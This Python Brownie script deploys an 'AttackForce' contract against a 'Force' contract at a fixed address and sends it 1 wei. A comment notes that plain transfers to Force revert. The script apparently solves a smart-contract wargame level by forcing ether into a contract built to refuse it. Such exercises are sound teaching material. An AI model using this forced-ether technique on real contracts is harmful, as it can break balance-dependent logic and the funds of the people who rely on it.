from brownie import accounts,config,AttackForce, web3, Force

def main():
    contract = '0xC987A0DcbcaFDcFAdC579F1584dCcA1597D45BB7'
    player = accounts.add(config['wallets']['from_key'])

    attack_contract = AttackForce.deploy(contract,{'from':player})

    attack_contract.force({"from":player, "amount":1})

    # Simple transfer or send won't work because the Force implements 
    # neither receive nor fallaback functions. Calls with any value will revert.
    # player.transfer(Force.at(contract)) (Wrong)

    
    print(f"Final contract balance: {web3.eth.getBalance(contract)}")